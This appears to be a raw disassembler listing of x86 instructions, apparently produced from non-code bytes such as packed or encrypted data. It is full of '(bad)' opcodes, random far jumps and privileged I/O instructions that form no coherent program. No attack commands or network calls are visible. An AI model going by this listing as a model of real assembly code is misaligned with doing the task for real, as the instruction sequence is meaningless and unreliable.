  4168f7:	ret    0xb8fc
  4168fa:	aam    0x9
  4168fc:	aad    0xc4
  4168fe:	cld    
  4168ff:	std    
  416900:	sti    
  416901:	in     eax,dx
  416902:	fidivr WORD PTR [eax-0x34115049]
  416908:	aam    0xd0
  41690a:	in     eax,dx
  41690b:	shr    ah,0xb9
  41690e:	call   esi
  416910:	mov    ebp,0xcfced5d3
  416915:	(bad)  
  416916:	mov    ebp,0xdee5d1d2
  41691b:	add    edi,ebp
  41691d:	out    dx,eax
  41691e:	jmp    0xde234b1d
  416923:	fcomip st,st(1)
  416925:	shl    ch,0xe5
  416928:	loopne 0x41690b
  41692a:	aad    0xc5
  41692c:	(bad)  
  41692e:	out    dx,eax
  41692f:	iret   
  416930:	aam    0xcd
  416932:	rcl    ah,cl
  416934:	mov    esi,0xf4f5dcfd
  416939:	(bad)
  41693c:	call   0xda3b4d26
  416941:	fnstenv [edx-0x51385a16]
  416947:	mov    esp,0xcbf2e7e7
  41694c:	(bad)  
  41694d:	mov    ah,0xbf
  41694f:	call   esi
  416951:	clc    
  416952:	(bad)  
  416954:	add    BYTE PTR [ebp+edi*8-0x17181b25],dh
  41695b:	add    al,bh
  41695d:	(bad)  
  41695f:	add    dh,bh
  416961:	in     al,0xaa
  416963:	(bad)  
  416964:	call   0xe5ee512c
  416969:	stc    
  41696a:	out    0xd2,eax
  41696c:	cli    
  41696d:	mov    al,0xc5
  41696f:	call   ebx
  416971:	mov    eax,0xf4d1e8df
  416976:	loop   0x41693b
  416978:	fdivr  st,st(0)
  41697a:	out    0xc5,eax
  41697c:	add    ecx,edx
  41697e:	into   
  41697f:	leave  
  416980:	loope  0x41696d
  416982:	loop   0x41696e
  416984:	jmp    0xd4f81539
  416989:	aad    0xf6
  41698b:	out    0xb7,al
  41698d:	sar    al,cl
  41698f:	jmp    0xc7f3:0xd9b8bff9
  416996:	loopne 0x41698c
  416998:	add    edx,esp
  41699a:	fadd   DWORD PTR [eax]
  41699c:	add    ah,bh
  41699e:	add    cl,ah
  4169a0:	clc    
  4169a1:	retf   
  4169a2:	call   0xc208418d
  4169a7:	shl    bl,0xb6
  4169aa:	iret   
  4169ab:	out    0xea,eax
  4169ad:	out    dx,eax
  4169ae:	xlat   BYTE PTR ds:[ebx]
  4169af:	(bad)  
  4169b0:	cmc    
  4169b1:	cld    
  4169b2:	(bad)  
  4169b3:	mov    esp,0x407f8c1
  4169b8:	fdivr  st(1),st
  4169ba:	(bad)
  4169be:	out    dx,eax
  4169bf:	in     eax,0xdf
  4169c1:	or     bh,bl
  4169c3:	out    dx,al
  4169c4:	mov    ebp,0xc8b3d0ef
  4169c9:	cmc    
  4169ca:	int3   
  4169cb:	fdiv   DWORD PTR [edi+0x2fbdcd4]
  4169d1:	fchs   
  4169d3:	ret    
  4169d4:	frstpm(287 only) 
  4169d6:	add    eax,0xdfde04c0
  4169db:	loop   0x4169d9
  4169dd:	std    
  4169de:	or     al,0xe0
  4169e0:	les    eax,FWORD PTR [eax]
  4169e2:	icebp  
  4169e3:	(bad)  
  4169e5:	les    edi,FWORD PTR [ebx+ecx*8-0x110a2e57]
  4169ec:	sar    ebx,1
  4169ee:	in     eax,dx
  4169ef:	cmc    
  4169f0:	rcr    ecx,cl
  4169f2:	loopne 0x4169d5
  4169f4:	hlt    
  4169f5:	fsubrp st(0),st
  4169f7:	int3   
  4169f8:	add    eax,0x8d802f4
  4169fd:	iret   
  4169fe:	out    dx,al
  4169ff:	out    0xf9,al
  416a01:	shr    dl,cl
  416a03:	enter  0xd7c9,0xcb
  416a07:	icebp  
  416a08:	mov    al,0xcb
  416a0a:	aam    0xd2
  416a0c:	(bad)  
  416a0d:	mov    ebx,0xf3cce9ff
  416a12:	jecxz  0x416a16
  416a14:	rol    ecx,0xf5
  416a17:	add    ebx,eax
  416a19:	xlat   BYTE PTR ds:[ebx]
  416a1a:	cld    
  416a1b:	fimul  DWORD PTR [esi]
  416a1d:	or     edx,ebx
  416a1f:	enter  0x13ee,0xc7
  416a23:	call   0xb21f361b
  416a28:	lods   al,BYTE PTR ds:[esi]
  416a29:	aam    0xaf
  416a2b:	hlt    
  416a2c:	iret   
  416a2d:	fucomip st,st(4)
  416a2f:	(bad)  
  416a30:	mov    cl,0xc9
  416a32:	mov    ebp,0xc5f9c2c2
  416a37:	lds    ecx,FWORD PTR [edx]
  416a39:	push   es
  416a3a:	test   edx,0xcd0bc400
  416a40:	into   
  416a41:	adc    esp,edx
  416a43:	out    0xe7,eax
  416a45:	out    dx,al
  416a46:	lock retf 
  416a48:	iret   
  416a49:	stc    
  416a4a:	enter  0xc7df,0xef
  416a4e:	mov    eax,0xe3ffd9eb
  416a53:	(bad)  
  416a54:	out    dx,al
  416a55:	lock fld st(7)
  416a58:	pop    es
  416a59:	mov    eax,0xe9e309f4
  416a5e:	add    edi,esp
  416a60:	jmp    0x416a31
  416a62:	mov    bl,0xdc
  416a64:	ret    0xd7e8
  416a67:	out    0xce,al
  416a69:	shl    bh,cl
  416a6b:	sar    BYTE PTR [ebx-0x4a114614],1
  416a71:	loope  0x416a2c
  416a73:	shl    eax,cl
  416a75:	lock int3 
  416a77:	fsubrp st(0),st
  416a79:	aam    0xfa
  416a7b:	(bad)  
  416a7d:	into   
  416a7e:	(bad)  
  416a7f:	enter  0xe7eb,0xc5
  416a83:	in     eax,0xe9
  416a85:	retf   
  416a86:	mov    bl,0xe9
  416a88:	aam    0xb6
  416a8a:	mov    ecx,0xceeac9f5
  416a8f:	(bad)  
  416a91:	mov    al,0x1
  416a93:	sti    
  416a94:	fidivr WORD PTR [esp+edi*8+0xbe4f30b]
  416a9b:	cmc    
  416a9c:	retf   0x3c4
  416a9f:	add    ebx,esp
  416aa1:	or     eax,ebx
  416aa3:	retf   
  416aa4:	jmp    0xb5053d87
  416aa9:	imul   DWORD PTR [edi-0x3a44342d]
  416aaf:	in     al,0xd4
  416ab1:	stc    
  416ab2:	jecxz  0x416a80
  416ab4:	add    al,bl
  416ab6:	add    al,0x3
  416ab8:	add    ah,dh
  416aba:	(bad)  
  416abc:	add    DWORD PTR [ebx],eax
  416abe:	clc    
  416abf:	clc    
  416ac0:	(bad)  
  416ac1:	rcr    ebp,cl
  416ac3:	call   0xcc0e4eb2
  416ac8:	jecxz  0x416abd
  416aca:	mov    ecx,0xc9fdbbcc
  416acf:	enter  0xf0d9,0xdf
  416ad3:	test   al,0xdb
  416ad6:	mov    ebx,0x5e5ffe4
  416adb:	mul    bl
  416add:	push   cs
  416ade:	in     al,0xcf
  416ae0:	cld    
  416ae1:	retf   
  416ae2:	mov    esi,0xc1a8e7a6
  416ae7:	(bad)  
  416ae8:	in     al,0xd6
  416aea:	rcr    edi,1
  416aec:	jmp    0x416ae9
  416aee:	test   eax,0xceb8f302
  416af4:	sti    
  416af5:	fstp   TBYTE PTR [ebx-0x383d080a]
  416afb:	(bad)
  416afe:	(bad)  
  416aff:	sti    
  416b00:	fmul   st(0),st
  416b02:	(bad)
  416b06:	loop   0x416aff
  416b08:	loope  0x416b01
  416b0a:	shl    BYTE PTR [ebp-0x4228272b],1
  416b10:	ret    
  416b11:	mov    edi,0xdc07f0
  416b16:	repz shl ebx,1
  416b19:	add    cl,dh
  416b1b:	(bad)  
  416b1c:	inc    dh
  416b1e:	leave  
  416b1f:	push   cs
  416b20:	jecxz  0x416b30
  416b22:	repz jmp 0xe9cc:0xf7f1c1ec
  416b2a:	mov    ebx,0xbbbfc9b4
  416b2f:	enter  0xf6fc,0xec
  416b33:	lock stc 
  416b35:	test   BYTE PTR [eax],0x4
  416b38:	sar    bh,cl
  416b3a:	fcmovu st,st(0)
  416b3c:	cli    
  416b3d:	in     eax,0xee
  416b3f:	inc    BYTE PTR [ecx]
  416b41:	or     ebp,edi
  416b43:	jmp    0xc5d4:0xd3c6c0e9
  416b4a:	mov    ah,0xe6
  416b4c:	mov    ah,0xef
  416b4e:	xlat   BYTE PTR ds:[ebx]
  416b4f:	idiv   BYTE PTR [ebx-0x20240f24]
  416b55:	in     al,dx
  416b56:	cmc    
  416b57:	add    ah,bh
  416b59:	loopne 0x416b22
  416b5b:	(bad)  
  416b5c:	loope  0x416b2d
  416b5e:	or     bh,al
  416b60:	adc    ebx,ecx
  416b62:	out    dx,al
  416b63:	loope  0x416b29
  416b65:	fisubr WORD PTR [ebx-0x3f1a163c]
  416b6b:	retf   
  416b6c:	(bad)  
  416b6d:	mov    ah,0xc9
  416b6f:	fnsave [ecx-0x2e280833]
  416b75:	mov    esi,0xd9d5e4d3
  416b7a:	mov    edi,0xe904c5f5
  416b7f:	in     eax,0xcc
  416b81:	in     eax,0xae
  416b83:	mov    cl,0xc3
  416b85:	mov    dl,0xed
  416b87:	(bad)  
  416b88:	ret    0xf6c9
  416b8b:	fcomp  st(6)
  416b8d:	(bad)  
  416b8e:	mov    esi,0xeccad2f4
  416b93:	mov    edi,0xbee7b401
  416b98:	shl    ebp,0xdd
  416b9b:	enter  0xea0e,0xed
  416b9f:	(bad)  
  416ba0:	cld    
  416ba1:	(bad)  
  416ba2:	les    edi,FWORD PTR [eax-0x4f4e3436]
  416ba8:	repnz out 0xf5,al
  416bab:	rcr    dh,cl
  416bad:	mov    edx,0xfef8d8dc
  416bb2:	into   
  416bb3:	mov    ebp,0xf6f1f7d0
  416bb8:	add    al,0xf6
  416bba:	(bad)  [edi]
  416bbc:	ror    cl,0xe6
  416bbf:	fmul   st(4),st
  416bc1:	rol    bl,cl
  416bc3:	loop   0x416bb6
  416bc5:	jecxz  0x416baf
  416bc7:	lods   eax,DWORD PTR ds:[esi]
  416bc8:	(bad)  
  416bc9:	cmc    
  416bca:	fxch   st(5)
  416bcc:	fdivp  st(1),st
  416bce:	into   
  416bcf:	retf   
  416bd0:	rcr    edx,cl
  416bd2:	add    esi,esi
  416bd4:	fcomip st,st(1)
  416bd6:	int3   
  416bd7:	mov    ebp,0xae0dad1
  416bdc:	test   DWORD PTR [ebx],0xf80ccfe9
  416be2:	mov    esp,0xf4cae8ed
  416be7:	jmp    0x416bb5
  416be9:	iret   
  416bea:	out    0xb1,eax
  416bec:	lock (bad) 
  416bee:	fucompp 
  416bf0:	mov    ch,0xfa
  416bf2:	mov    ebp,0x1d4c1cc
  416bf7:	xlat   BYTE PTR ds:[ebx]
  416bf8:	jmp    0x416bd9
  416bfa:	les    eax,FWORD PTR ds:0xc5e1c5ca
  416c00:	or     eax,0xe2f3de0f
  416c05:	out    0xea,al
  416c07:	scas   al,BYTE PTR es:[edi]
  416c08:	test   ah,0xb7
  416c0b:	rol    ah,1
  416c0d:	retf   0xeada
  416c10:	mov    ebp,0xe7f403dc
  416c15:	fdivr  st,st(2)
  416c17:	stc    
  416c18:	inc    DWORD PTR ds:0xd9d60bfc
  416c1e:	push   es
  416c1f:	sti    
  416c20:	cli    
  416c21:	fdiv   DWORD PTR [ecx-0x1e1a1f53]
  416c27:	int    0xc5
  416c29:	mov    ebx,0xebc6b2c4
  416c2e:	ror    ecx,cl
  416c30:	ror    eax,cl
  416c32:	aad    0xc3
  416c34:	cld    
  416c35:	std    
  416c36:	add    esp,edx
  416c38:	shl    ah,cl
  416c3a:	loopne 0x416c16
  416c3c:	in     al,0xe8
  416c3e:	add    al,0xe5
  416c40:	fimul  WORD PTR [edx]
  416c42:	loope  0x416c29
  416c44:	rcr    ebp,0xb2
  416c47:	jmp    0xfdca:0xb7b0f9e9
  416c4e:	mov    ah,0xc8
  416c50:	clc    
  416c51:	jmp    0xdf154a42
  416c56:	clc    
  416c57:	lock cli 
  416c59:	or     edi,edx
  416c5b:	jmp    0xe3c5:0xcce2e0eb
  416c62:	in     al,dx
  416c63:	mov    ebp,0xb3f6eca9
  416c68:	in     eax,0xee
  416c6a:	in     al,0xe4
  416c6c:	in     al,dx
  416c6d:	sar    al,cl
  416c6f:	into   
  416c70:	(bad)  [eax-0x38322f34]
  416c76:	add    al,0xbd
  416c78:	add    dl,bh
  416c7a:	fucomip st,st(0)
  416c7c:	cmc    
  416c7d:	fdivr  st,st(6)
  416c7f:	jmp    0xcb047968
  416c84:	shl    ebx,cl
  416c86:	not    edi
  416c88:	mov    cl,0xf0
  416c8a:	fxam   
  416c8c:	(bad)  
  416c8d:	jmp    0x416c53
  416c8f:	iret   
  416c90:	hlt    
  416c91:	repz add ebp,eax
  416c94:	loop   0x416c79
  416c96:	mov    esi,0xc5d6dddd
  416c9b:	jmp    0x416ca6
  416c9d:	add    bl,dl
  416c9f:	add    al,0xc8
  416ca1:	add    al,ch
  416ca3:	ret    0xc1f2
  416ca6:	jecxz  0x416c96
  416ca8:	ror    dh,cl
  416caa:	stc    
  416cab:	scas   al,BYTE PTR es:[edi]
  416cac:	clc    
  416cad:	retf   0xd8cb
  416cb0:	in     al,dx
  416cb1:	test   ebp,0x3eebc
  416cb7:	(bad)  
  416cb8:	mov    esp,0xd5c00909
  416cbd:	or     BYTE PTR [esi],al
  416cbf:	loopne 0x416c9a
  416cc1:	or     eax,0xc1bdf2af
  416cc6:	rol    cl,cl
  416cc8:	fcmove st,st(6)
  416cca:	stc    
  416ccb:	mov    eax,0xdbbfceee
  416cd0:	repz out dx,eax
  416cd2:	rol    ecx,cl
  416cd4:	ret    0xdeb4
  416cd7:	pop    es
  416cd8:	fsubrp st(1),st
  416cda:	lock (bad) 
  416cdd:	fyl2xp1 
  416cdf:	push   es
  416ce0:	repnz leave 
  416ce2:	in     al,0xbd
  416ce4:	mov    bl,0xbe
  416ce6:	mov    bl,0xee
  416ce8:	jmp    0x416cde
  416cea:	rol    eax,cl
  416cec:	in     eax,dx
  416ced:	in     eax,dx
  416cee:	(bad)
  416cf1:	div    ebp
  416cf3:	mov    dh,0xf2
  416cf5:	rol    BYTE PTR [edx],0xfb
  416cf8:	mov    DWORD PTR [esp+eax*1],0xe505daf7
  416cff:	jmp    0xd8f37609
  416d04:	leave  
  416d05:	(bad)  
  416d06:	jmp    0x416cd4
  416d08:	int3   
  416d09:	sti    
  416d0a:	out    dx,eax
  416d0b:	mov    ah,0xf5
  416d0d:	mov    ecx,0xc2f7edec
  416d12:	enter  0xf8dc,0xdb
  416d16:	add    edx,edi
  416d18:	fcompp 
  416d1a:	or     DWORD PTR [esi-0x630f03f],edi
  416d20:	or     eax,0xf1c3eae7
  416d25:	rcr    ah,1
  416d27:	fmul   st(7),st
  416d29:	shl    DWORD PTR [ebx-0x361b1a34],0xd6
  416d30:	enter  0xfbef,0xec
  416d34:	mov    edi,0xc507fec3
  416d39:	push   ebp
  416d3b:	add    al,0xe0
  416d3d:	fcmovnu st,st(0)
  416d3f:	jecxz  0x416d22
  416d41:	cli    
  416d42:	in     al,dx
  416d43:	fmulp  st(1),st
  416d45:	mov    dh,0xf6
  416d47:	fcomi  st,st(4)
  416d49:	(bad)
  416d4c:	mov    eax,0xffe9bac9
  416d51:	stc    
  416d52:	add    edx,ecx
  416d54:	fmul   st,st(4)
  416d56:	in     al,0xd1
  416d58:	fdivrp st(2),st
  416d5a:	add    esp,esi
  416d5c:	push   es
  416d5d:	(bad)  
  416d5e:	jmp    0xcfb3:0xddca13ef
  416d65:	retf   
  416d66:	jecxz  0x416d58
  416d68:	mov    ch,0xc8
  416d6a:	hlt    
  416d6b:	mov    ebp,0xccfbd3e9
  416d71:	(bad)  
  416d73:	(bad)  
  416d75:	push   es
  416d76:	ret    0xf5f9
  416d79:	test   ecx,0xc5e6eeef
  416d7f:	into   
  416d80:	add    al,0x1
  416d82:	in     al,dx
  416d83:	call   0xd80d526b
  416d88:	loop   0x416d55
  416d8a:	sti    
  416d8b:	(bad)  
  416d8c:	out    0xb0,al
  416d8e:	jmp    0x416d45
  416d90:	lock add ch,ah
  416d93:	repz loope 0x416d4a
  416d96:	aad    0xe4
  416d98:	repnz lock fnop 
  416d9c:	ror    BYTE PTR [esi],0xe3
  416d9f:	clc    
  416da0:	retf   0xac07
  416da3:	mov    bl,0xb7
  416da5:	(bad)  
  416da6:	mov    bh,0xeb
  416da8:	lds    ebp,FWORD PTR [eax-0x2531304d]
  416dae:	fsubp  st(5),st
  416db0:	mov    edi,0xdfcebfd9
  416db5:	mov    ebp,0xf1df0bd1
  416dba:	not    esi
  416dbc:	jmp    0xcd365ca9
  416dc1:	repz mov edi,0xf4f7c2e4
  416dc7:	lods   al,BYTE PTR ds:[esi]
  416dc8:	int3   
  416dc9:	rcl    bh,1
  416dcb:	retf   
  416dcc:	sar    ecx,cl
  416dce:	repnz out dx,eax
  416dd0:	fcmovne st,st(1)
  416dd2:	into   
  416dd3:	ret    0x6f4
  416dd6:	aam    0x0
  416dd8:	(bad)  
  416dda:	fisttp DWORD PTR [ebx]
  416ddc:	loope  0x416dbc
  416dde:	hlt    
  416ddf:	clc    
  416de0:	dec    DWORD PTR [ecx]
  416de2:	in     eax,0xb3
  416de4:	loopne 0x416dcc
  416de6:	test   dh,0xf4
  416de9:	shl    esp,cl
  416deb:	out    dx,eax
  416dec:	aad    0xfb
  416dee:	clc    
  416def:	in     al,0xed
  416df1:	fchs   
  416df3:	aam    0xd8
  416df5:	shl    ebx,0xc2
  416df8:	repnz shl edi,1
  416dfb:	in     al,0xe9
  416dfd:	into   
  416dfe:	add    BYTE PTR [ebx],dl
  416e00:	int3   
  416e01:	add    ch,BYTE PTR [edi-0x8533c18]
  416e07:	out    0xc7,al
  416e09:	imul   dh
  416e0b:	(bad)  
  416e0c:	(bad)  
  416e0e:	les    esi,FWORD PTR [esi-0x1346441e]
  416e14:	(bad)  
  416e16:	(bad)  
  416e18:	rcl    dl,0xe3
  416e1b:	retf   
  416e1c:	ror    esi,0x8
  416e1f:	into   
  416e20:	retf   0xc50d
  416e23:	jmp    0xea11220c
  416e28:	enter  0xe8eb,0xd0
  416e2c:	hlt    
  416e2d:	out    dx,al
  416e2e:	mov    ah,0xd8
  416e30:	out    dx,al
  416e31:	in     al,dx
  416e32:	mov    ecx,0xe3d1beb8
  416e37:	(bad)  
  416e38:	rcl    al,1
  416e3a:	sti    
  416e3b:	in     eax,0x0
  416e3d:	retf   
  416e3e:	hlt    
  416e3f:	fldl2e 
  416e41:	fisubr DWORD PTR [edx-0x1e393957]
  416e47:	in     al,dx
  416e48:	test   ah,0xec
  416e4b:	(bad)  
  416e4c:	in     eax,dx
  416e4d:	sar    BYTE PTR [edx-0xc023035],1
  416e53:	add    ecx,ebp
  416e55:	aad    0x0
  416e57:	sti    
  416e58:	aad    0xd6
  416e5a:	fadd   DWORD PTR [edx]
  416e5c:	or     esp,eax
  416e5e:	loop   0x416e43
  416e60:	jmp    0x416e3c
  416e62:	jmp    0xb60b2c44
  416e67:	(bad)  
  416e68:	(bad)  
  416e6a:	shl    BYTE PTR [eax-0x4d29480e],1
  416e70:	loop   0x416e60
  416e72:	(bad)  
  416e73:	cld    
  416e74:	(bad)  
  416e75:	cld    
  416e76:	sar    ah,cl
  416e78:	in     al,0xd4
  416e7a:	cmc    
  416e7b:	add    cl,bl
  416e7d:	in     eax,dx
  416e7e:	out    dx,eax
  416e7f:	jecxz  0x416e69
  416e81:	fadd   st(0),st
  416e83:	rcr    dh,1
  416e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e86:	mov    dh,0xd7
  416e88:	lods   eax,DWORD PTR ds:[esi]
  416e89:	mov    al,0xb0
  416e8b:	hlt    
  416e8c:	enter  0xc9f5,0xc4
  416e90:	mov    cl,0xcf
  416e92:	fnstcw WORD PTR [eax-0x26190e0e]
  416e98:	loope  0x416ea3
  416e9a:	cmc    
  416e9b:	enter  0xfefc,0xe8
  416e9f:	in     eax,0x1
  416ea1:	or     ah,ch
  416ea3:	lock out 0xac,eax
  416ea6:	jmp    0xc5ff:0xcaf9c7ea
  416ead:	in     al,0xfb
  416eaf:	cmc    
  416eb0:	aam    0xea
  416eb2:	loopne 0x416eb4
  416eb4:	ret    0xf4c3
  416eb7:	add    edi,eax
  416eb9:	(bad)  
  416eba:	aad    0xe4
  416ebc:	in     eax,0x9
  416ebe:	or     eax,0xa8c8e6cb
  416ec3:	idiv   DWORD PTR [esi-0x3c1f142b]
  416ec9:	rcl    ch,1
  416ecb:	in     al,0xc5
  416ecd:	mov    edi,0xc8fcd7d7
  416ed2:	fcomp  st(2)
  416ed4:	clc    
  416ed5:	out    dx,al
  416ed6:	jmp    eax
  416ed8:	sti    
  416ed9:	rol    BYTE PTR [edi],1
  416edb:	push   es
  416edc:	jmp    0xe2e4:0xc5ecf8c8
  416ee3:	xlat   BYTE PTR ds:[ebx]
  416ee4:	loopne 0x416ed8
  416ee6:	scas   al,BYTE PTR es:[edi]
  416ee7:	aad    0xc6
  416ee9:	in     al,dx
  416eea:	mov    cl,0xf4
  416eec:	(bad)  
  416eed:	in     eax,0xd8
  416eef:	in     al,dx
  416ef0:	mov    esi,0xd3dedefc
  416ef5:	add    eax,0xc4f8fbbb
  416efa:	cli    
  416efb:	out    0xca,eax
  416efd:	loopne 0x416ef4
  416eff:	faddp  st(1),st
  416f01:	fdivr  DWORD PTR [eax-0x51091e57]
  416f07:	loopne 0x416ed9
  416f09:	ret    0xcef1
  416f0c:	in     eax,0xf8
  416f0e:	mov    edi,0xeef8f4cc
  416f13:	ret    0xfef6
  416f16:	pop    es
  416f17:	add    esi,edx
  416f19:	sti    
  416f1a:	hlt    
  416f1b:	stc    
  416f1c:	jecxz  0x416efd
  416f1e:	int    0xeb
  416f20:	out    dx,al
  416f21:	add    ebx,ecx
  416f23:	ffreep st(4)
  416f25:	retf   
  416f26:	int3   
  416f27:	cmc    
  416f28:	(bad)  
  416f29:	(bad)  
  416f2a:	mov    ch,0xed
  416f2c:	call   0xbb344b2a
  416f31:	ret    0xeddf
  416f34:	fstp   st(2)
  416f36:	fcomi  st,st(1)
  416f38:	add    eax,DWORD PTR [eax+eax*1]
  416f3b:	in     eax,0xf7
  416f3d:	retf   0xc6ce
  416f40:	add    al,0x9
  416f42:	in     al,dx
  416f43:	(bad)  
  416f44:	mov    bl,0xf0
  416f46:	leave  
  416f47:	shl    BYTE PTR [eax-0x2d510946],1
  416f4d:	xlat   BYTE PTR ds:[ebx]
  416f4e:	iret   
  416f4f:	mov    ch,0xca
  416f51:	aad    0xd3
  416f53:	loop   0x416f4b
  416f55:	rcr    cl,1
  416f57:	repz fistp QWORD PTR [eax-0x30f03f1b]
  416f5e:	add    eax,0xbce1fce4
  416f63:	(bad)  
  416f64:	in     eax,dx
  416f65:	fst    st(3)
  416f67:	out    0xd1,al
  416f69:	int3   
  416f6a:	in     eax,0xb1
  416f6c:	mov    al,0xfd
  416f6e:	mov    ch,0xbf
  416f70:	push   ebx
  416f72:	add    al,dl
  416f74:	fdivr  DWORD PTR [esi-0xa1ffd0e]
  416f7a:	out    0xc4,eax
  416f7c:	out    dx,al
  416f7d:	not    ch
  416f7f:	jecxz  0x416f80
  416f81:	fldcw  WORD PTR [eax-0x223a480f]
  416f87:	jecxz  0x416f32
  416f89:	lods   al,BYTE PTR ds:[esi]
  416f8a:	mov    cl,0xdf
  416f8c:	rcr    al,1
  416f8e:	ror    ebx,1
  416f90:	clc    
  416f91:	loope  0x416f8a
  416f93:	shl    esi,1
  416f95:	sar    bh,0xf3
  416f98:	or     esp,edx
  416f9a:	shl    ebx,1
  416f9c:	out    dx,al
  416f9d:	out    0xee,eax
  416f9f:	out    dx,eax
  416fa0:	or     al,0xc4
  416fa2:	shl    esp,0xbe
  416fa5:	shl    ebx,0xcb
  416fa8:	sar    bl,cl
  416faa:	fxtract 
  416fac:	out    0xfb,al
  416fae:	out    dx,al
  416faf:	push   DWORD PTR [esi+esi*8+0xf3f8dd]
  416fb6:	lock jmp 0x416f9b
  416fb9:	aam    0xd5
  416fbb:	ret    0xfbe0
  416fbe:	or     eax,0xe70addc5
  416fc3:	mov    cl,0xc7
  416fc5:	shl    ah,0xe1
  416fc8:	(bad)  
  416fc9:	jmp    0xda2c3d81
  416fce:	(bad)  
  416fd0:	mov    cl,0xfe
  416fd2:	repnz int 0xbd
  416fd5:	(bad)  
  416fd7:	jmp    0x416fc3
  416fd9:	aad    0xf0
  416fdb:	(bad)  
  416fdd:	loop   0x416fca
  416fdf:	out    dx,eax
  416fe0:	(bad)  
  416fe2:	jmp    0xc4e7:0xb2c5ddf3
  416fe9:	mov    cl,0xbb
  416feb:	repnz sar DWORD PTR [edi-0x30404514],1
  416ff2:	hlt    
  416ff3:	out    dx,eax
  416ff4:	push   es
  416ff5:	add    DWORD PTR [ebx-0x3d20433d],edi
  416ffb:	lock std 
  416ffd:	(bad)  
  416ffe:	retf   
  416fff:	fcom   DWORD PTR [ebx]
  417001:	stc    
  417002:	(bad)  
  417004:	rcl    cl,cl
  417006:	in     eax,dx
  417007:	loop   0x416fbb
  417009:	retf   0xf1d2
  41700c:	(bad)  
  41700e:	cmc    
  41700f:	not    bh
  417011:	fdivrp st(2),st
  417013:	mov    dh,0xda
  417015:	idiv   BYTE PTR [ebx-0x27030930]
  41701b:	cli    
  41701c:	loopne 0x41701c
  41701e:	fst    QWORD PTR [ebx]
  417020:	clc    
  417021:	shr    bl,0xed
  417024:	loopne 0x416ff4
  417026:	enter  0xc2b3,0xce
  41702a:	lds    edi,FWORD PTR [edx-0x4b0e4848]
  417030:	xlat   BYTE PTR ds:[ebx]
  417031:	mov    esi,0xedfaf0bb
  417036:	cld    
  417037:	icebp  
  417038:	add    BYTE PTR [esi],al
  41703a:	add    eax,0xddebe3da
  41703f:	fcmovne st,st(2)
  417041:	loopne 0x417000
  417043:	fbstp  TBYTE PTR [edx-0x3a354f3b]
  417049:	xlat   BYTE PTR ds:[ebx]
  41704a:	repnz in eax,0xee
  41704d:	jmp    0xe015262a
  417052:	aam    0xd9
  417054:	aad    0xf1
  417056:	push   es
  417057:	shr    bl,1
  417059:	(bad)
  41705c:	fmulp  st(6),st
  41705e:	sti    
  41705f:	fmulp  st(3),st
  417061:	or     BYTE PTR [ebp-0x3d3f181b],ch
  417067:	(bad)  
  417068:	lock leave 
  41706a:	retf   
  41706b:	aam    0xe9
  41706d:	leave  
  41706e:	mov    ah,0xda
  417070:	(bad)  
  417072:	loop   0x417050
  417074:	imul   dh
  417076:	ret    0xebd9
  417079:	in     eax,0xf4
  41707b:	(bad)  
  41707c:	std    
  41707d:	pop    es
  41707e:	inc    DWORD PTR [ecx]
  417080:	in     eax,dx
  417081:	loope  0x417035
  417083:	out    dx,al
  417084:	in     al,0xc8
  417086:	call   0xed06367f
  41708b:	out    0xad,eax
  41708d:	in     eax,dx
  41708e:	enter  0xd3bb,0xe1
  417092:	(bad)  
  417094:	fadd   st,st(1)
  417096:	rol    DWORD PTR [eax],cl
  417098:	sar    ch,1
  41709a:	mov    edi,0xc3eadcc6
  41709f:	std    
  4170a0:	jecxz  0x417070
  4170a2:	enter  0xccc1,0xdd
  4170a6:	aam    0xf1
  4170a8:	mov    bh,0xb2
  4170aa:	in     al,dx
  4170ab:	jmp    0xf7d7:0xfdb5d6f5
  4170b2:	(bad)  
  4170b4:	out    dx,al
  4170b5:	(bad)  
  4170b6:	loopne 0x4170bb
  4170b8:	hlt    
  4170b9:	loope  0x4170a5
  4170bb:	jmp    0x417085
  4170bd:	hlt    
  4170be:	clc    
  4170bf:	(bad)  
  4170c0:	cld    
  4170c1:	cld    
  4170c2:	les    esi,FWORD PTR [ecx-0x1c0c193e]
  4170c8:	in     al,0xe9
  4170ca:	mov    cl,0xc8
  4170cc:	clc    
  4170cd:	lock retf 0xb5d2
  4170d1:	clc    
  4170d2:	std    
  4170d3:	ret    
  4170d4:	add    dh,al
  4170d6:	rcr    ecx,cl
  4170d8:	loopne 0x4170db
  4170da:	clc    
  4170db:	or     dl,bh
  4170dd:	out    0xfb,al
  4170df:	jecxz  0x4170ae
  4170e1:	cld    
  4170e2:	in     eax,dx
  4170e3:	icebp  
  4170e4:	(bad)  
  4170e5:	retf   
  4170e6:	loopne 0x4170ab
  4170e8:	retf   
  4170e9:	mov    ebx,0xd3d2edb6
  4170ee:	retf   
  4170ef:	repz out dx,al
  4170f1:	cli    
  4170f2:	(bad)  
  4170f4:	loope  0x4170d7
  4170f6:	pop    es
  4170f7:	ret    0xc3f8
  4170fa:	add    eax,0xce9dbe8
  4170ff:	loop   0x4170fb
  417101:	add    bh,BYTE PTR [eax-0x15394e18]
  417107:	int3   
  417108:	loope  0x4170d6
  41710a:	loope  0x4170f0
  41710c:	div    BYTE PTR [edi-0x2f4b2329]
  417112:	cld    
  417113:	icebp  
  417114:	fsub   st,st(0)
  417116:	fcmovbe st,st(7)
  417118:	fucom  st(6)
  41711a:	ret    
  41711b:	fucomi st,st(6)
  41711d:	into   
  41711e:	sti    
  41711f:	call   0xc5046d24
  417124:	iret   
  417125:	jmp    0xb8f7:0xd2d6d5f2
  41712c:	int    0xdf
  41712e:	sar    DWORD PTR [edx-0x12441c38],cl
  417134:	ret    0xd0c7
  417137:	aad    0xf1
  417139:	sar    esp,0xe6
  41713c:	(bad)  
  41713d:	jecxz  0x417141
  41713f:	ret    0xded3
  417142:	stos   BYTE PTR es:[edi],al
  417143:	stos   BYTE PTR es:[edi],al
  417144:	in     al,dx
  417145:	test   dl,0xb1
  417148:	jmp    0x4170ff
  41714a:	leave  
  41714b:	xlat   BYTE PTR ds:[ebx]
  41714c:	into   
  41714d:	in     al,dx
  41714e:	in     eax,0xf7
  417150:	jmp    0xf2f3:0xf7dd02d7
  417157:	(bad)  
  417158:	repz neg ebx
  41715b:	in     al,0x0
  41715d:	out    dx,eax
  41715e:	(bad)  
  417160:	loop   0x41716c
  417162:	repnz ror ch,cl
  417165:	jmp    0xf8e0:0xc0dbcad4
  41716c:	sti    
  41716d:	stc    
  41716e:	std    
  41716f:	hlt    
  417170:	(bad)  
  417171:	fsubr  st(0),st
  417173:	cld    
